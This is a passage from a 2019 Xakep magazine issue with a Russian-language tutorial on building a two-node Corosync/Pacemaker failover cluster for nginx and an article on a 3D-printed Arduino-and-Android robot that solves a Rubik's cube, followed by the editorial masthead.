из строя или вовсе прекращать работу.      девизмедныев жизни:трубы.НерешаемыхГлавный
В этой статье я расска жу о двух бесплатных      задачправильноенет, надо решение!только найти
                                                                                           ryzhevtsev@gmail.com
и откры тых решениях, которые позволят
тебе создать кластер и не сой ти при этом
с ума от объемов документации.


Рассмотрим нес колько воз можных решений.
 • Oracle Clusterware для Oracle Unbreakable Linux — достаточно дорогой
   вариант, его стоит использовать, только если имеешь дело с продуктами
   Oracle.
 • Veritas Infoscale Availabilty — коммерческое решение, ранее известное
   как  Veritas  Cluster  Server. Лицензия VCS Access на узловой кластер
   из четырех нод будет стоить порядка 20–30 тысяч долларов.
 • Red Hat Cluster Suite — решение с открытым исходным кодом. Но для его
   грамотного использования необходимо изучить большой объем докумен‐
   тации, на что у тебя уйдет куча времени.

Я же хочу рассказать, как создать кластеризацию на уровне приложений
с высокой отка зоустойчивостью в сжатые сроки, с ограниченным бюджетом
и без глу боких познаний в пос троении кластеров. Оптимальным решением,
на мой взгляд, будет использование Corosync и Pacemaker. Эта связка бес‐
платна, ее легко осво ить, и на развертывание не уйдет много времени.
  Corosync — програм мный про дукт, который позволя ет соз давать единый
кластер из нескольких аппа рат ных или виртуальных серверов. Corosync
отслеживает и передает состояние всех участни ков (нод) в кластере.
   Этот продукт позволяет:
 • мониторить статус при ложений;
 • оповещать приложения о смене активной ноды в кластере;
 • отправлять идентичные сообщения процессам на всех нодах;
 • предоставлять доступ к общей базе данных с конфигурацией и статис‐
   тикой;
 • отправлять уведомления об изменениях, произведенных в базе.

Pacemaker — менеджер ресурсов кластера. Он позволя ет использовать
службы и объекты в рамках одного кластера из двух или более нод. Вот вкрат‐
це его дос тоинс тва:
 • позволяет находить и устранять сбои на уровне нод и служб;
 • не зависит от подсистемы хра нения: можем забыть общий накопитель,
   как страшный сон;
 • не зависит от типов ресур сов: все, что можно прописать в скрипты, можно
   кластеризовать;
 • поддерживает  STONITH  (Shoot‐The‐Other‐Node‐In‐The‐Head),  то  есть
   умершая нода изолируется и запросы к ней не поступа ют, пока нода
   не отправит сооб щение о том, что она сно ва в рабочем состоянии;
 • поддерживает кворумные и ресурсозависимые кластеры любого размера;
 • поддерживает прак тически любую избыточную конфигурацию;
 • может автоматически реплициро вать конфиг на все узлы кластера —
   не придется пра вить все вруч ную;
 • можно задать порядок запуска ресурсов, а также их сов местимость
   на одном узле;
 • поддерживает расширенные типы ресурсов: клоны (когда ресурс запущен
   на множес тве узлов) и дополнительные состояния (master/slave и подоб‐
   ное) — акту аль но для СУБД (MySQL, MariaDB, PostgreSQL, Oracle);
 • имеет единую клас терную оболоч ку CRM с под дер жкой скриптов.

Идея зак лючается в том, что с помощью Corosync мы пос троим кластер,
а следить за его состоянием будем с помощью Pacemaker.


В ТЕОРИИ
Попробуем решить сле дующие задачи.
 1. Раз вернуть кластер высокой отказоустойчивости из двух нод для обработ‐
   ки заб росов от клиентов при условии, что они используют общий сетевой
   адрес и службу веб‐сервера nginx.
 2. Протес тировать отказ одной из нод в кластере, убе диться, что ресурсы
   передаются на рабочую ноду, когда активная нода упала.
 3. Вре мя проверки сбоя на активной ноде 30 секунд.





                 Схема работы кластера из двух нод


             INFO

                    Перед  началом  любых  работ  настоятельно
                       советую нарисовать схему взаимодействия узлов
                          сети. Это упростит понимание и прин ципы вза‐
                    имодействия и работы узлов.



НА ПРАКТИКЕ
Настала пора реали зовать намеченные задачи. Я в своем примере исполь‐
зовал дис трибутив Red Hat Enterprise Linux 7. Ты можешь взять любой другой
Linux, принципы построения кластера будут те же.
  Для начала установим пакеты, которые требуются для нормальной работы
ПО на обе их нодах (ставим пакеты на обе ноды).


$ sudo yum install ‐y python3‐devel ruby‐devel gcc libffi‐devel
libffi‐dev fontconfig coreutils rubygems gcc‐c++ wget

Следующую коман ду тоже нужно исполнять с правами рута, но если исполь‐
зовать sudo, то скрипт установщика отработает неверно и не соз дастся поль‐
зователь hacluster.


$ yum install ‐y pacemaker pcs resource‐agents corosync

Проверяем пользователя hacluster (Pacemaker) и меняем пароль:


$ sudo cat /etc/passwd | grep hacluster



  hacluster:x:189:189:cluster user:/home/hacluster:/sbin/nologin


Авторизуемся на нодах под именем пользователя hacluster. Если выходит
ошибка доступа к ноде (Error: Unable to communicate with ha‐node1),
то, ско рее всего, из‐под Linux‐УЗ наложены запреты на исполь зование уда‐
ленных оболочек. Необ ходимо снять ограничение SUDO на вре мя установки.
   Когда увидишь сле дующее, можешь двигать ся дальше:


$ sudo ‐l



  User  may run the following commands on ha‐node1:
      (ALL) NOPASSWD: ALL


Теперь про веря ем на обеих нодах уста новленные пакеты corosync, pacemak‐
er и pcs, добавляем в автозагрузку и запус каем службу конфигурации
pacemaker.


$ sudo yum info pacemaker pcs resource‐agents corosync
$ sudo systemctl enable pcsd.service; sudo systemctl start pcsd.
service

Авторизуемся на нодах под пользователем hacluster:


$ sudo pcs cluster auth ha‐node1 ha‐node2 ‐u hacluster

Создаем кластер из двух нод:


$ sudo pcs cluster setup ‐‐force ‐‐name HACLUSTER ha‐node1 ha‐node2

Включаем и запускаем все кластеры на всех нодах:


$ sudo pcs cluster enable ‐‐all; sudo pcs cluster start ‐‐all

При использовании двух нод вклю чаем stonith. Он нужен для «добивания»
серверов, которые не смог ли полностью завершить рабочие процессы. Игно‐
рируем кворум.


$ sudo pcs property set stonith‐enabled=true
$ sudo pcs property set no‐quorum‐policy=ignore

Запрашива ем ста тус на обеих нодах ($ sudo pcs status) и видим:



  Cluster name: HACLUSTER
  Stack: corosync
  Current DC: ha‐node2 (version 1.1.18‐11.el7_5.3‐2b07d5c5a9) ‐ partition
  with quorum
  Last updated: Wed Oct 17 13:12:00 2018
  Last change: Wed Oct 17 13:10:47 2018 by root via cibadmin on ha‐node1


    2 nodes configured
  0 resources configured


    Online: [ ha‐node1 ha‐node2 ]


    No resources


    Daemon Status:
    corosync: active/enabled
    pacemaker: active/enabled
    pcsd: active/enabled


Добавляем виртуаль ный сетевой адрес и nginx как ресурсы (надеюсь, ты пом‐
нишь про тайм‐аут в 30 секунд) и запрашива ем ста тус кластера.


$ sudo pcs resource create virtual_ip ocf:heartbeat:IPaddr2 ip=10.10.
10.1 cidr_netmask=24 op monitor interval=30s
$ sudo pcs resource create nginx ocf:heartbeat:nginx op monitor
interval=30s timeout=60s
$ sudo pcs status



  Full list of resources:


     virtual_ip     (ocf::heartbeat:IPaddr2):       Started ha‐node1
   nginx            (ocf::heartbeat:nginx):           Started ha‐node1


    Daemon Status:
    corosync: active/enabled
    pacemaker: active/enabled
    pcsd: active/enabled


Выключаем первую ноду на несколь ко минут. Запрашиваем ста тус вто рой
ноды, чтобы убе дить ся, что первая недос тупна.



  Full list of resources:


     virtual_ip     (ocf::heartbeat:IPaddr2):       Started ha‐node2
   nginx            (ocf::heartbeat:nginx):           Started ha‐node2


    Daemon Status:
    corosync: active/enabled
    pacemaker: active/enabled
    pcsd: active/enabled


Как только первая нода будет доступна, вручную переключаем на нее вир‐
туальный IP и nginx командой


$ sudo pcs resource move virtual_ip ha‐node1; sudo pcs resource move
nginx ha‐node1

Осталось запросить ста тус кластера и убедиться, что адрес присвоен первой
ноде.


$ sudo pcs resource show



  virtual_ip     (ocf::heartbeat:IPaddr2):       Started ha‐node1


Список всех под держи ваемых сервисов можно пос мотреть c помощью
команды $ sudo crm_resource ‐‐list‐agents ocf.


КЛАСТЕРИЗАЦИЯ НА БАЗЕ NGINX
На обеих нодах должен быть установлен и нас троен nginx. Подключаемся
к кластеру и создаем следующий ресурс:


$ sudo pcs cluster auth ha‐node1 ha‐node2 ‐u hacluster
$ sudo pcs resource create nginx ocf:heartbeat:nginx op monitor
interval=30s timeout=30s

Здесь мы создаем ресурс из служ бы, которая будет каждые 30 секунд про‐
веряться, и в случае минутного тайм‐аута ресурс будет включен на другой
ноде.


             INFO

                       Чтобы удалить ноду из кластера, воспользуйся
                      командой $ sudo pcs cluster node re‐
                   move <node_name>.



ВЫВОДЫ
Мы построили простой, но очень отказоустойчивый клас тер для фронтенда
приложения. Помни, что построение кластера — задача творческая и все
зависит толь ко от тво их смекалки и воображения. Невыполнимых задач
для системного адми нис тра тора не быва ет!
GEEK

 ГОЛОВОЛОМКА
 ДЛЯ РОБОТА





                                       Алексей Карпович
                                                    soniksky@tut.by

         КАК Я СДЕЛАЛ МАШИНУ
     ДЛЯ СБОРКИ КУБИКА РУБИКА





Мне всег да нра вилось решать головоломки, программи‐
ровать и паять. И однажды все это вылилось в проект,
о котором я хочу тебе рас ска зать. Давай сде лаем робота,
который собирает кубик Рубика!


        WWW

                   Я не первый, кто реализовал эту идею. Есть, нап‐
                       ример,  робот  из  набора  Lego  Mindstorms
                      или конструкция с сайта Otvinta.com.


Мне не хотелось повторять уже готовое изделие. Чтобы лучше понимать,
как фун кци они рует робот, и научить ся чему‐то новому, я решил делать все
сам.


             INFO

                     Подробно о том, как начать свою карь еру в элек‐
                        тротехнике, читай в статье «Я у мамы инже нер!
                       Как перес тать бояться паяльника и начать тво‐
                        рить».



ВЫБИРАЕМ ПЛАТФОРМУ
Любой робот состоит из двух основных сис тем: механической и электронной.
Для механичес кой сос тавляющей я рассмат ривал конс труктор Lego, но его
наборы могли оказаться очень дорогими, к тому же к нему очень сложно
пристроить нестандартные части и блоки. Поэтому я остановился на проекте
с сайта Otvinta.com и взял за основу их конструкцию. Ее детали можно легко
распечатать на 3D‐принтере.
  В качестве платформы для электрон ного блока управления я выбрал
смартфон на Android и микроконтроллер Arduino, которые связал по USB.
На мой взгляд, такая плат форма оптималь на для создания прос тых и дешевых
роботов.
   У современных смартфо нов есть все необходимое: камера, Bluetooth, Wi‐
Fi, USB, GPS‐датчик, сенсорный дисплей для управления, достаточно мощ‐
ный процессор и большой объем памяти. Можно исполь зовать бюджетный
смартфон, что бы уменьшить стоимость проекта.
  Микроконтроллер Arduino нужен, чтобы отвечать за процессы реаль ного
времени: управлять сервопри водами, считывать информацию с внешних дат‐
чиков, получать управляющие команды со смартфона по USB и отправлять
на него нужные данные.
  Мой выбор остановился на смар тфо не Motorola Moto G и микроконтрол‐
лере Arduino Mega 2560.





                   Смартфон Motorola Moto G





               Микроконтроллер Arduino Mega 2560


ПЕЧАТАЕМ ДЕТАЛИ И СОБИРАЕМ КОРПУС
Модели всех деталей для корпуса робота можно скачать и распечатать на 3D‐
принтере (ZIP). Луч ше печатать с максимальной точностью. Я этот момент
не учел, поэто му детали потом пришлось подправлять с помощью наждачной
бумаги.


             INFO

                       Внутри деталей прин тер оставляет полости, что
                        сказывается на их прочности. Нес колько деталей
                       сломались при сборке, и мне пришлось их скле‐
                          ивать. Поэтому советую распечатывать мелкие
                       детали без полостей внутри.


Сервоприводы советую брать оригиналь ные, они лучше подходят по конс‐
трукции и дол жны работать надежнее.
   Крепеж я купил на строитель ном рынке. Кор пус собирал по инструкции,
это оказалось нес ложно.
   Также роботу нужны два блока питания: на 12 В для Arduino и на 5 В для
питания сервоприводов.





                Механическая часть робота

Осталось прикрепить к корпусу робота микроконтрол лер Arduino и смартфон.
Смартфон приделаем к задней части кор пуса с помощью специального дер‐
жателя таким образом, чтобы его камера была направле на на кубик в центре.





                   Робот собственной пер соной

Сервоприводы подключаем к микрокон троллеру и подаем на них питание.
Теперь, когда механическая часть робота собрана, мы готовы приступить
к написа нию программ, которые будут управлять нашим устройством.


УПРАВЛЕНИЕ СЕРВОПРИВОДАМИ
Управлять сер вопри водами у нас будет микроконтроллер Arduino Mega 2560.
Чтобы написать для него программу, понадобится средство разработки. Ar‐
duino IDE свобод но распространяется в интернете и работает на любой сов‐
ременной ОС. После ее установ ки соз даем новый скетч для написа ния
исходного кода. Язык программи рования похож на C, что сильно облегчит
нашу работу.
  Для работы с сервопри водами нам нужно подключить соответс твующую
библиотеку:


#include "Servo.h"

Затем объявить глобальные переменные, представ ляющие все наши восемь
приводов:


Servo servo_US;
Servo servo_UG;
Servo servo_RS;
Servo servo_RG;
Servo servo_DS;
Servo servo_DG;
Servo servo_LS;
Servo servo_LG;

Названия переменным даны по расположению устрой ств: например, ser‐
vo_RS относится к приводу, который расположен справа и вращает дер‐
жатель вок руг своей оси, а servo_RG также расположен справа и двигает
держатель внутрь и наружу.
   Также нуж но объ явить пины, к которым физически подключены наши
моторчики:


int pin_US = 9;
int pin_UG = 8;
int pin_RS = 11;
int pin_RG = 10;
int pin_DS = 6;
int pin_DG = 7;
int pin_LS = 4;
int pin_LG = 5;

Значения портов у тебя могут отличаться, все зависит от того, куда подклю‐
чены провода.
  Далее в функции setup() нам надо подключить пины к соответству ющим
переменным сервоприводов:


void setup() {
  servo_US.attach(pin_US);
  servo_UG.attach(pin_UG);
  servo_RS.attach(pin_RS);
  servo_RG.attach(pin_RG);
  servo_DS.attach(pin_DS);
  servo_DG.attach(pin_DG);
  servo_LS.attach(pin_LS);
  servo_LG.attach(pin_LG);
}

Теперь, если мы хотим установить какой‐нибудь сервопри вод на необ‐
ходимый угол, нам надо вызвать функцию writeMicroseconds у соответству‐
ющей Servo. Аргу мент, который передается в эту функцию, задает угол
поворота    сервопривода    и    может    принимать     значение
от 1000 до 2000 для стан дартно го привода, но в нашем случае этот диапазон
гораздо шире, подбирать конкрет ные зна чения для положения моторчиков
нужно экспе риментально.
   Главной функцией нашей программы должно быть выполнение команд
из формул для сборки кубика Рубика. Нап ример, команда R означает повер‐
нуть пра вую грань кубика по часовой стрелке на 90 гра дусов, R' — повернуть
эту же грань против часовой стрелки. Такие же коман ды существуют для каж‐
дой грани и имеют соот ветствующие названия: L — левая грань, U — верхняя,
D — ниж няя, B — задняя, F — передняя.
   Вот функция, которая выпол няет команду R:


void make_R()
{
  move_RS_up();
  delay(1000);
  move_RG_right();
  delay(1000);
  move_RS_cent();
  delay(1000);
  move_RG_left();
  delay(1000);
}

Здесь фун кция move_RS_up() вращает пра вый держатель вверх по часовой
стрелке, move_RG_right() двигает правый держатель вправо, move_RS_‐
cent() вращает пра вый держатель против часовой стрелки в исходное
положение, move_RG_left() двигает дер жатель влево. Функция delay(1000)
создает задер жку исполнения кода на одну секунду.
   Вот, нап ример, как выглядит функция move_RS_up():


void move_RS_up() {
  servo_RS.writeMicroseconds(2000);
}

А вот как выглядит функция move_RG_right():


void move_RG_right() {
  servo_RG.writeMicroseconds(800);
}

По аналогии можно написать необ ходимые функции для всех наших команд,
которых должно быть двенадцать: по две на каждую грань.


ПРОГРАММА ДЛЯ СМАРТФОНА
Наша программа для смартфона должна уметь выполнять следующие фун‐
кции: отправ лять команды манипуляций кубиком на Arduino по USB, фотог‐
рафировать грани кубика и рас познавать цвета квадратиков. И что самое
важное — выполнять алгоритм решения этой головоломки.
   Программи ровать будем в Android Studio на Java.
  Для отправ ки дан ных по USB существует много библиотек, но я выбрал
библиотеку Омара Афлака.
  Для работы с камерой сначала подключаем библиоте ку:


import android.hardware.Camera;

Должен сказать, что это ста рая библиотека, но работает она неп лохо.
  Нам понадобится также возможность сохранять снимки в файл. Для этого
добавляем в файл AndroidManifest.xml следующие стро ки:


<uses‐permission android:name="android.permission.CAMERA" />
<uses‐feature android:name="android.hardware.camera" />
<uses‐permission android:name="android.permission.WRITE_EXTERNAL_
STORAGE" />

Дальше в главном клас се нашей программы в фун кцию onCreate() надо
добавить сле дующий код:


int permissionCheck = ContextCompat.checkSelfPermission(this,
Manifest.permission.READ_EXTERNAL_STORAGE);
if (permissionCheck != PackageManager.PERMISSION_GRANTED) {
  if (ActivityCompat.shouldShowRequestPermissionRationale(this,
    Manifest.permission.READ_EXTERNAL_STORAGE)) {
  } else {
    ActivityCompat.requestPermissions(this, new String[]{Manifest.
permission.READ_EXTERNAL_STORAGE}, 1);
  }
}
permissionCheck = ContextCompat.checkSelfPermission(this, Manifest.
permission.CAMERA);
if (permissionCheck != PackageManager.PERMISSION_GRANTED) {
  if (ActivityCompat.shouldShowRequestPermissionRationale(this,
    Manifest.permission.CAMERA)) {
  } else {
    ActivityCompat.requestPermissions(this, new String[]{Manifest.
permission.CAMERA}, 1);
  }
}

Так мы спрашиваем у пользователя разрешение на использование камеры
и на сохранение снимков в пос тоянную память.
   Теперь нам надо объявить глобаль ные переменные:


static Camera camera = null;
File photoFile;

И инициализировать их:


File pictures = Environment.getExternalStoragePublicDirectory(Enviro
nment.DIRECTORY_PICTURES);
photoFile = new File(pictures, "myphoto.jpg");
camera = Camera.open();
Camera.Parameters params = camera.getParameters();
params.setWhiteBalance("shade");
params.setZoom(25);
try {
  camera.setParameters(params);
} catch (Exception e) {
  e.printStackTrace();
}

Можно заметить, что мы задали камере небольшой зум. Это необ ходимо,
чтобы кубик занимал всю площадь снимка. Коэффициент, который переда‐
ется  в функцию setZoom, подбирается  эксперимен тально, он  зависит
от смартфона и его камеры.
  Все готово, что бы делать фотографии граней кубика. Для этого нуж но каж‐
дый раз вызывать вот этот код:


// 1
camera.startPreview();
// 2
if (arduino.isOpened()) {
  byte[] bytes = {33, 1, 21};
  arduino.send(bytes);
}
// 3
try{
  Thread.sleep(3000);
} catch (Exception e) {
  e.printStackTrace();
}
// 4
camera.takePicture(null, null, new Camera.PictureCallback() {
  @Override
  public void onPictureTaken(byte[] data, Camera camera) {
    // 5
    try {
      photoFile = getOutputMediaFile();
      FileOutputStream fos = new FileOutputStream(photoFile);
      fos.write(data);
      fos.close();
      Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.
length);
      for (int i = 0; i < 9; i++) {
        // 6
      }
      camera.stopPreview();
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
});

Обрати вни мание на комментарии с номерами. Так мне будет проще рас ска‐
зать, что же происходит.
 1. Начина ем делать снимок.
 2. Здесь arduino — это переменная для отправки команд на микроконтрол‐
   лер. Мы отправляем три числа: 33 — символ начала посыл ки, 1 — число
   команд, которые мы отправляем, 21 — код команды повернуть кубик
   к камере необ ходимой гранью, эту команду нужно добавить в программу
   на Arduino.
 3. Делаем паузу выполнения прог раммы на три секунды, чтобы подож дать,
   пока сервопри воды повер нут кубик.
 4. Делаем снимок и вызываем процедуру для его обра ботки.
 5. Сохраняем фотографию в файл.
 6. В последнем пункте мы должны написать код, который будет определять
   цвет каж дого квадратика и сох ранять его в массив.

Этот код мы должны вызвать для каждой из шес ти граней кубика, под ставляя
свои парамет ры.
   Теперь пора распознавать цвета. Делать это можно самыми разными спо‐
собами. Я предлагаю взять файл снимка со смартфона, отправить его в Pho‐
toshop, опре делить примерные цен тры квадратиков в пикселях и составить
палитру цве тов кубика в ком понентах RGB.
  После того как мы дела ем снимок грани кубика, для каждого центра квад‐
ратика мы опре деляем его цветовые составляющие и смот рим, к какому цве‐
ту из нашей палитры они бли же всего. Так мы можем распознавать цвета.
Главное — не забыть создать массив для хранения этой информации.
  Со сканиро вани ем кубика покончено, и нам остается толь ко его собрать.


РЕШАЕМ КУБИК РУБИКА
Для сборки кубика Рубика вручную существуют разные методики. Одна
из самых распространенных — метод Джессики Фридрих. Он предполагает
знание большого числа формул, но позволяет достичь цели за минимальное
число ходов. Этот метод, конечно, можно было реализовать прог раммно
для нашего робота, но это была бы очень громоздкая реализация. Для чис‐
ленного решения кубика Рубика есть свои алгоритмы, и они поз воляют най ти
решение с гораздо меньшим числом ходов.


             INFO

                       Кубик Рубика всегда может быть решен не более
                     чем в двад цать ходов, считая за один ход поворот
                     любой из шести граней на 90 или 180 градусов.
                      Известны кон фигурации, требующие для сборки
                      не менее двад цати ходов. Таким образом, «число
                        Бога» кубика Рубика равно двадцати.


Я выбрал алгоритм Косимбы, потому что у него есть уже готовые реализации
на Java, которые могут быть легко встроены в наш проект на Android Studio.
Одну из таких реализаций можно найти на GitHub. Из это го про екта нам
понадобятся только три файла: Search.java, Tools.java, Util.java. Ска‐
чиваем их и добавляем в свой проект в Android Studio. Теперь в каждом
из этих файлов в самом верху после слова package нужно указать путь
пакета, который соответс твует твоему проекту.
  После того как наша программа просканирует все цвета квадратиков
кубика, нам надо проверить, все ли пра вильно мы сделали и существует ли
для нашего кубика решение. Это дела ется вызовом следующей функции:


Tools.verify(facelet)

Если все хорошо, она должна вернуть 0. Здесь facelet — это стро ковая
переменная, содержащая цветовую конфигурацию кубика Рубика. Сейчас я
расскажу, как ее правильно записать.
  Цветовая карта кубика имеет следующий вид:



  |            |
  | U1  U2  U3 |
  |            |
  | U4  U5  U6 |
  |            |
  | U7  U8  U9 |
  |            |            |            |            |
  | L1  L2  L3 | F1  F2  F3 | R1  R2  F3 | B1  B2  B3 |
  |            |            |            |            |
  | L4  L5  L6 | F4  F5  F6 | R4  R5  R6 | B4  B5  B6 |
  |            |            |            |            |
  | L7  L8  L9 | F7  F8  F9 | R7  R8  R9 | B7  B8  B9 |
  |            |            |            |            |
  | D1  D2  D3 |
  |            |
  | D4  D5  D6 |
  |            |
  | D7  D8  D9 |
  |            |


Таким обра зом, у каждого цветного квадратика на кубике есть свое бук‐
венно‐циф ровое обозначение, как бы свой адрес. А схема записи строки
цветового состояния кубика имеет следующий вид:



  U1U2U3U4U5U6U7U8U9R1R2R3R4R5R6R7R8R9F1F2F3F4F5F6F7F8F9D1D2D3D4D5D6D7D8D9
  L1L2L3L4L5L6L7L8L9B1B2B3B4B5B6B7B8B9


Здесь вместо U1 надо писать код цвета квадратика по адресу U1. И так далее
для всех адресов.
   Как же определяется код цвета? Мы берем вер хнюю грань U и смотрим,
какого цве та ее центральный квад ратик. Нап ример, он красный, значит, все
красные квад ратики будут иметь код U. А если на нижней грани центральный
квадрат имеет оран жевый цвет, зна чит, все оран жевые цвета име ют код D.
Таким образом составляется строка состояния кубика.
   Теперь, когда мы сос тавили строку состояния кубика и проверили, что
у него есть решение, нам надо найти это решение в виде формулы, которая
для нас будет представлять список команд для выполнения микроконтрол‐
лером Arduino. Делается это следующим образом:


Search search = new Search();
String result = search.solution(facelet, 25, 1000, 0, 0);

В функцию solution передаются следующие парамет ры: facelet — стро ка
состояния кубика, 25 — максимальное число команд, которое может быть
в решении. Остальные параметры я оставил в исходном состоянии.
  Переменная result содер жит список команд, разделенных пробелами.
Последовательно отпра вив эти команды в виде кодов на наш микроконтрол‐
лер и дож давшись, пока они будут выпол нены, мы должны получить решен ную
головоломку.
  Замечу, что в решении среди команд могут быть вари анты, нап ример R2,
что означает «повернуть правую грань два раза». Для каждой грани —
отдельная коман да. Ты без труда реализуешь их в Arduino IDE.


ЗАПУСК И ТЕСТИРОВАНИЕ
Теперь у нас все готово, чтобы запустить нашего робота и как следует про‐
тестировать его. У меня он заработал с первого раза: кубик Рубика был соб‐
ран. Пос ле многих повторений я обнаружил некоторые недостатки.
 1. Тре бова тель ность к освещению. Освещение должно быть не сильно ярким
   и не прямым. На кубике Рубика не должно быть бликов, ина че наш робот
   некорректно распозна ет цвета и не найдет решение.
 2. Ку бик Рубика иногда застревает в нижнем держателе. При ходится оста‐
   навливать сборку и начинать сначала. Чем выз вана эта неприятная осо‐
   бенность, пока неясно, возможно, надо под точить держатель, уве личив
   его ширину.
 3. Вре мя сборки составляет примерно  пять  минут. Долго! Но можно
  еще поэкспериментировать с параметрами задержек в программе и поп‐
   робовать за счет этого сократить время сборки.


             INFO

                     Специалист по робототехнике Бен Кац (Ben Katz)
                      и разработ чик программного обеспечения Джа‐
                      ред Ди Карло (Jared Di Carlo) создали робота,
                      который   способен   собрать   кубик   Рубика
                        за 0,38 секунды.


На видео — робот в действии.





ПРОДОЛЖАЙ ТВОРИТЬ
Наш робот делает свое дело, несмотря на некоторые недостатки. Выбранная
платформа оправда ла себя, она оказалась простой и функци ональной. Мы
изучили новые технологии, научились делать что‐то своими руками и неплохо
провели время.


        WWW

                      Скачать все исходники можно тут и тут.



Комплектующие обошлись мне примерно в 400 долларов США. Навер ное,
эту сумму стоит тоже отнести к недостаткам, робот получился недеше вым.
Главные затраты — на распечатку деталей на 3D‐прин тере. Но в конце кон‐
цов, для любимо го хобби ничего не жалко!
    №01 (238)
          Андрей Письменный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБ РИК
          Андрей Письменный        Илья Русанен          Александр «Dr.»
               pismenny@glc.ru             rusanen@glc.ru            Лозовский
                                                                           lozovsky@glc.ru
          Иван «aLLy» Андреев       Евгений Зобнин          Татьяна Чупрова
            iam@russiansecurity.expert          zobnin@glc.ru              chuprova@glc.ru
                                 Андрей Васильков
                                               a.vasilkov@glc.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРА НЕНИЕ И ПОД ПИСКА

                             Воп росы по подписке: lapina@glc.ru
                            Воп росы по материалам: support@glc.ru





Адрес редакции: 125080, город Мос ква, Волоколам ское шоссе, дом 1, стро ение 1, этаж 8, помеще ние IX, ком ната 54, офис 7. Изда тель: ИП
Югай Алек сандр Оле гович, 400046, Вол гоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Мос ква, Волоколам ское шос се, дом 1, стро ение 1, этаж 8, помеще ние IX, комната 54, офис 7. Зарегис трировано в Федераль ной службе
по над зору в сфере свя зи, информацион ных тех нологий и массовых коммуника ций (Рос комнадзоре), сви детельство Эл № ФС77‐ 67001 от 30.
08.2016 года. Мне ние редак ции не обя затель но сов пада ет с мнением авторов. Все матери алы в номере пре доставляются как информация
к раз мышле нию. Лица, использующие дан ную информа цию в противозаконных целях, могут быть привлечены к ответс твенности. Редак ция
не несет ответствен ности за содер жание рек ламных объявле ний в номере. По вопросам лицен зирова ния и получе ния прав на исполь зование
редакционных материалов журнала обра щайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2019